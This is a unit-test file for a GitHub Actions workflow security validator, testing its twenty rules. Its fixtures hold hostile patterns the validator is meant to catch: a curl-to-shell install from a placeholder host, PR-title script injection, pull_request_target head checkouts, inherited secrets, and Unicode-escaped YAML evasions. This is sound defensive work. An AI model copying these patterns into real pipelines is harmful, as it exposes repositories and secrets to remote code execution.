from __future__ import annotations

import importlib.util
import io
import json
import subprocess
import sys
import tempfile
import unittest
from datetime import date
from pathlib import Path
from contextlib import redirect_stdout
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parents[3]
MODULE_PATH = REPO_ROOT / "tools/validators/governance/validate_workflow_security.py"
BASELINE_PATH = MODULE_PATH.with_name("workflow_security_baseline.json")
SPEC = importlib.util.spec_from_file_location("kfm_validate_workflow_security", MODULE_PATH)
assert SPEC is not None and SPEC.loader is not None
module = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = module
SPEC.loader.exec_module(module)


class WorkflowSecurityTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        (self.root / ".github/workflows").mkdir(parents=True)

    def _write(self, name: str, text: str) -> Path:
        path = self.root / ".github/workflows" / name
        path.write_text(text.strip() + "\n", encoding="utf-8")
        return path

    def _safe_workflow(self, *, name: str = "safe", action_ref: str = "a" * 40) -> str:
        return f"""
name: {name}
"on":
  pull_request:
permissions:
  contents: read
jobs:
  validate:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@{action_ref}
        with:
          persist-credentials: false
      - run: python -m unittest
"""

    def _rules(self, *rule_ids: str) -> set[str]:
        findings, _ = module.scan(self.root)
        observed = {finding.rule_id for finding in findings}
        if rule_ids:
            self.assertEqual(set(rule_ids), observed)
        return observed

    def test_profile_has_exactly_twenty_stable_rules(self) -> None:
        self.assertEqual(20, len(module.RULES))
        self.assertEqual(
            [f"KFM-WF-{number:03d}" for number in range(1, 21)],
            [rule.rule_id for rule in module.RULES],
        )
        self.assertEqual(
            {"KFM-WF-006", "KFM-WF-008", "KFM-WF-020"},
            {rule.rule_id for rule in module.RULES if rule.baseline_allowed},
        )

    def test_safe_workflow_passes_without_baseline(self) -> None:
        self._write("safe.yml", self._safe_workflow())
        findings, count = module.scan(self.root)
        code, report = module.evaluate(findings, count, {}, as_of=date(2026, 8, 12))
        self.assertEqual(0, code)
        self.assertEqual("PASS", report["outcome"])
        self.assertEqual(20, report["rule_count"])
        self.assertFalse(report["authority"]["authorizes_repository_write"])

    def test_action_container_checkout_permission_and_timeout_rules(self) -> None:
        self._write(
            "unsafe.yml",
            self._safe_workflow(action_ref="v4")
            .replace("          persist-credentials: false\n", "")
            .replace("    timeout-minutes: 10\n", "")
            .replace("  contents: read", "  contents: write")
            .replace(
                "    steps:",
                "    container: python:3.12\n    steps:",
            ),
        )
        self._rules(
            "KFM-WF-004",
            "KFM-WF-005",
            "KFM-WF-006",
            "KFM-WF-008",
            "KFM-WF-009",
            "KFM-WF-020",
        )

    def test_checkout_comment_cannot_satisfy_credential_rule(self) -> None:
        commented = self._safe_workflow().replace(
            "          persist-credentials: false",
            "          # persist-credentials: false",
        )
        self._write("commented.yml", commented)
        self._rules("KFM-WF-006")

        (self.root / ".github/workflows/commented.yml").unlink()
        inline = self._safe_workflow().replace(
            "        with:\n          persist-credentials: false",
            "        with: {persist-credentials: false}",
        )
        self._write("inline.yml", inline)
        self.assertEqual(set(), self._rules())

    def test_noncanonical_yaml_cannot_silently_pass(self) -> None:
        alternate_indent = """
name: alternate-indent
"on": {pull_request: {}}
permissions: {contents: read}
jobs:
    validate:
        runs-on: self-hosted
        steps:
            - uses: actions/checkout@v4
            - run: curl https://example.invalid/install | sh
"""
        self._write("alternate.yml", alternate_indent)
        self.assertIn("KFM-WF-001", self._rules())

        (self.root / ".github/workflows/alternate.yml").unlink()
        anchored = self._safe_workflow().replace(
            "permissions:\n  contents: read",
            "permissions: &read_permissions\n  contents: read",
        )
        self._write("anchored.yml", anchored)
        self.assertIn("KFM-WF-001", self._rules())

        (self.root / ".github/workflows/anchored.yml").unlink()
        flow_step = self._safe_workflow().replace(
            "      - run: python -m unittest",
            "      - {uses: owner/action@v1}",
        )
        self._write("flow-step.yml", flow_step)
        self.assertIn("KFM-WF-001", self._rules())

    def test_inline_comments_do_not_hide_triggers_or_write_permissions(self) -> None:
        commented = self._safe_workflow().replace(
            '"on":\n  pull_request:',
            '"on": # trusted-event comment\n  pull_request_target:',
        ).replace(
            "permissions:\n  contents: read",
            "permissions: # permission comment\n  contents: write # unsafe",
        ).replace(
            "          persist-credentials: false",
            "          persist-credentials: false\n          ref: ${{ github.event.pull_request.head.sha }}",
        )
        self._write("comments.yml", commented)
        observed = self._rules()
        self.assertTrue(
            {"KFM-WF-008", "KFM-WF-009", "KFM-WF-011", "KFM-WF-012", "KFM-WF-013"}.issubset(
                observed
            ),
            observed,
        )

    def test_quoted_runner_and_bracket_expressions_fail_closed(self) -> None:
        unsafe = self._safe_workflow().replace(
            "    runs-on: ubuntu-latest",
            '    runs-on: "self-hosted"',
        ).replace(
            "permissions:\n  contents: read",
            "env:\n  TOKEN: ${{ secrets['TOKEN'] }}\npermissions:\n  contents: read",
        ).replace(
            "      - run: python -m unittest",
            "      - run: echo \"${{ github['event']['pull_request']['title'] }}\"",
        )
        self._write("brackets.yml", unsafe)
        observed = self._rules()
        self.assertTrue(
            {"KFM-WF-014", "KFM-WF-016", "KFM-WF-017"}.issubset(observed),
            observed,
        )

    def test_reusable_caller_job_and_partial_duplicate_name_handling(self) -> None:
        caller = """
name: reusable-caller
"on":
  workflow_dispatch:
permissions:
  contents: read
jobs:
  call:
    uses: ./.github/workflows/called.yml
"""
        self._write("caller.yml", caller)
        self.assertEqual(set(), self._rules())

        (self.root / ".github/workflows/caller.yml").unlink()
        first = self._write("first.yml", self._safe_workflow(name="same-name"))
        self._write("second.yml", self._safe_workflow(name="same-name"))
        findings, count = module.scan(self.root, [first])
        self.assertEqual(1, count)
        self.assertEqual({"KFM-WF-003"}, {finding.rule_id for finding in findings})

    def test_checkout_matching_is_case_insensitive(self) -> None:
        workflow = self._safe_workflow().replace(
            "actions/checkout@",
            "Actions/Checkout@",
        ).replace("          persist-credentials: false\n", "")
        self._write("case.yml", workflow)
        self._rules("KFM-WF-006")

    def test_dynamic_runner_and_invariant_baseline_emission_fail_closed(self) -> None:
        dynamic = self._safe_workflow().replace(
            "    runs-on: ubuntu-latest",
            "    runs-on: ${{ matrix.runner }}",
        )
        self._write("dynamic.yml", dynamic)
        self.assertIn("KFM-WF-014", self._rules())

        invariant = module._finding(
            "KFM-WF-004",
            ".github/workflows/dynamic.yml",
            "uses=1",
            "actions/checkout@v4",
            1,
        )
        output = io.StringIO()
        with mock.patch.object(module, "scan", return_value=((invariant,), 1)):
            with redirect_stdout(output):
                code = module.main(["--emit-baseline"])
        self.assertEqual(2, code)
        self.assertEqual("ERROR_VALIDATOR", json.loads(output.getvalue())["outcome"])

    def test_semantic_yaml_encodings_cannot_bypass_security_rules(self) -> None:
        cases = {
            "quoted-uses.yml": self._safe_workflow().replace(
                "      - run: python -m unittest",
                '      - "uses": owner/action@v1',
            ),
            "quoted-run.yml": self._safe_workflow().replace(
                "      - run: python -m unittest",
                '      - "run": curl https://example.invalid/install | sh',
            ),
            "escaped-write.yml": self._safe_workflow().replace(
                "  contents: read",
                '  contents: "wri\\u0074e"',
            ),
            "folded-write.yml": self._safe_workflow().replace(
                "  contents: read",
                "  contents: >-\n    write",
            ),
            "escaped-runner.yml": self._safe_workflow().replace(
                "    runs-on: ubuntu-latest",
                '    runs-on: "self\\u002dhosted"',
            ),
            "quoted-inherit.yml": self._safe_workflow().replace(
                "    steps:",
                '    secrets: "inherit"\n    steps:',
            ),
            "escaped-on.yml": self._safe_workflow().replace(
                '"on":',
                '"o\\u006e":',
            ),
        }
        for filename, workflow in cases.items():
            with self.subTest(filename=filename):
                path = self._write(filename, workflow)
                findings, _ = module.scan(self.root, [path])
                observed = {finding.rule_id for finding in findings}
                if filename == "quoted-inherit.yml":
                    self.assertIn("KFM-WF-015", observed)
                else:
                    self.assertIn("KFM-WF-001", observed)
                path.unlink()

    def test_bracket_pr_head_reference_is_detected(self) -> None:
        unsafe = self._safe_workflow().replace(
            "  pull_request:",
            "  pull_request_target:",
        ).replace(
            "          persist-credentials: false",
            "          persist-credentials: false\n          ref: ${{ github.event.pull_request.base.sha }}",
        ).replace(
            "      - run: python -m unittest",
            "      - run: git fetch origin \"${{ github['event']['pull_request']['head']['sha'] }}\"",
        )
        self._write("bracket-head.yml", unsafe)
        self.assertIn("KFM-WF-013", self._rules())

    def test_runner_group_mapping_is_denied(self) -> None:
        unsafe = self._safe_workflow().replace(
            "    runs-on: ubuntu-latest",
            "    runs-on:\n      group: build-runners",
        )
        self._write("runner-group.yml", unsafe)
        self.assertIn("KFM-WF-014", self._rules())

        (self.root / ".github/workflows/runner-group.yml").unlink()
        flow_group = self._safe_workflow().replace(
            "    runs-on: ubuntu-latest",
            "    runs-on: {group: secret-runners}",
        )
        self._write("flow-runner-group.yml", flow_group)
        self.assertIn("KFM-WF-014", self._rules())

        (self.root / ".github/workflows/flow-runner-group.yml").unlink()
        custom_label = self._safe_workflow().replace(
            "    runs-on: ubuntu-latest",
            "    runs-on: gpu-private",
        )
        self._write("custom-runner.yml", custom_label)
        self.assertIn("KFM-WF-014", self._rules())

    def test_trusted_event_and_shell_invariants_fail_closed(self) -> None:
        unsafe = self._safe_workflow().replace(
            "  pull_request:",
            "  pull_request_target:",
        ).replace(
            "          persist-credentials: false",
            "          persist-credentials: false\n          ref: ${{ github.event.pull_request.head.sha }}",
        ).replace(
            "      - run: python -m unittest",
            "      - run: |\n"
            "          curl https://example.invalid/install | sh\n"
            "      - run: echo '${{ github.event.pull_request.title }}'\n"
            "      - run: echo '::set-output name=x::y'",
        )
        self._write("trusted-event.yml", unsafe)
        observed = self._rules()
        self.assertTrue(
            {
                "KFM-WF-012",
                "KFM-WF-013",
                "KFM-WF-017",
                "KFM-WF-018",
                "KFM-WF-019",
            }.issubset(observed),
            observed,
        )

    def test_write_trigger_runner_secrets_and_name_rules(self) -> None:
        first = self._safe_workflow(name="Duplicate Name").replace(
            "  pull_request:",
            "  pull_request:\n  workflow_call:",
        ).replace(
            "permissions:\n  contents: read",
            "env:\n  TOKEN: ${{ secrets.DEPLOY_TOKEN }}\npermissions:\n  contents: read",
        ).replace(
            "    runs-on: ubuntu-latest",
            "    runs-on: self-hosted\n    permissions:\n      pull-requests: write",
        ).replace(
            "    steps:",
            "    steps:\n      - uses: ./.github/workflows/reusable.yml\n        secrets: inherit",
        )
        self._write("first.yml", first)
        self._write("second.yml", self._safe_workflow(name="duplicate name"))
        observed = self._rules()
        self.assertTrue(
            {
                "KFM-WF-003",
                "KFM-WF-010",
                "KFM-WF-014",
                "KFM-WF-015",
                "KFM-WF-016",
            }.issubset(observed),
            observed,
        )

    def test_baseline_accepts_exact_legacy_finding_but_rejects_growth(self) -> None:
        path = self._write(
            "legacy.yml",
            self._safe_workflow().replace("          persist-credentials: false\n", ""),
        )
        findings, count = module.scan(self.root)
        self.assertEqual(1, len(findings))
        finding = findings[0]
        baseline = {
            finding.fingerprint: {
                "evidence_sha256": finding.evidence_sha256,
                "expires_on": "2026-12-31",
                "fingerprint": finding.fingerprint,
                "path": finding.path,
                "rule_id": finding.rule_id,
                "subject": finding.subject,
            }
        }
        code, report = module.evaluate(findings, count, baseline, as_of=date(2026, 8, 12))
        self.assertEqual(0, code)
        self.assertEqual("PASS", report["outcome"])
        self.assertEqual(1, report["counts"]["baselined_warning"])

        path.write_text(path.read_text(encoding="utf-8") + "# harmless path-byte change\n", encoding="utf-8")
        findings, count = module.scan(self.root)
        code, report = module.evaluate(findings, count, baseline, as_of=date(2026, 8, 12))
        self.assertEqual(0, code, report)

        path.write_text(
            path.read_text(encoding="utf-8").replace(
                "      - run: python -m unittest",
                "      - uses: actions/checkout@" + "a" * 40,
            ),
            encoding="utf-8",
        )
        findings, count = module.scan(self.root)
        code, report = module.evaluate(findings, count, baseline, as_of=date(2026, 8, 12))
        self.assertEqual(1, code)
        self.assertEqual("FAIL_NEW_DRIFT", report["outcome"])

    def test_stale_baseline_and_invariant_waiver_are_rejected(self) -> None:
        self._write("safe.yml", self._safe_workflow())
        stale = {
            "sha256:" + "1" * 64: {
                "expires_on": "2026-12-31",
                "path": ".github/workflows/safe.yml",
            }
        }
        findings, count = module.scan(self.root)
        code, report = module.evaluate(findings, count, stale, as_of=date(2026, 8, 12))
        self.assertEqual(1, code)
        self.assertEqual("FAIL_INVARIANT", report["outcome"])

        payload = json.loads(BASELINE_PATH.read_text(encoding="utf-8"))
        payload["entries"] = [
            {
                "evidence_sha256": "sha256:" + "2" * 64,
                "expires_on": "2026-12-31",
                "fingerprint": "sha256:" + "3" * 64,
                "path": ".github/workflows/safe.yml",
                "rule_id": "KFM-WF-006",
                "subject": "job=validate;step=step-1",
            }
        ]
        payload["entries"][0]["rule_id"] = "KFM-WF-004"
        bad = self.root / "baseline.json"
        bad.write_text(json.dumps(payload, sort_keys=True), encoding="utf-8")
        with self.assertRaisesRegex(module.BaselineError, "waive an invariant"):
            module.load_baseline(bad)

    def test_repository_baseline_matches_exact_current_drift(self) -> None:
        baseline = module.load_baseline(BASELINE_PATH)
        findings, count = module.scan(REPO_ROOT)
        code, report = module.evaluate(findings, count, baseline, as_of=date(2026, 8, 12))
        self.assertEqual(0, code, report)
        self.assertEqual("PASS", report["outcome"])
        self.assertGreater(count, 0)
        self.assertEqual(len(module.discover_workflows(REPO_ROOT)), count)
        self.assertEqual(0, report["counts"]["baselined_warning"])
        self.assertEqual(0, report["counts"]["fail_invariant"])
        self.assertEqual(0, report["counts"]["fail_new_drift"])

    def test_cli_is_deterministic_json_and_no_network(self) -> None:
        command = [
            sys.executable,
            str(MODULE_PATH),
            "--repo-root",
            str(REPO_ROOT),
            "--baseline",
            str(BASELINE_PATH),
        ]
        first = subprocess.run(command, capture_output=True, text=True, check=False)
        second = subprocess.run(command, capture_output=True, text=True, check=False)
        self.assertEqual(0, first.returncode, first.stdout + first.stderr)
        self.assertEqual(first.stdout, second.stdout)
        report = json.loads(first.stdout)
        self.assertEqual("PASS", report["outcome"])
        self.assertNotIn("duration", first.stdout)


if __name__ == "__main__":
    unittest.main()
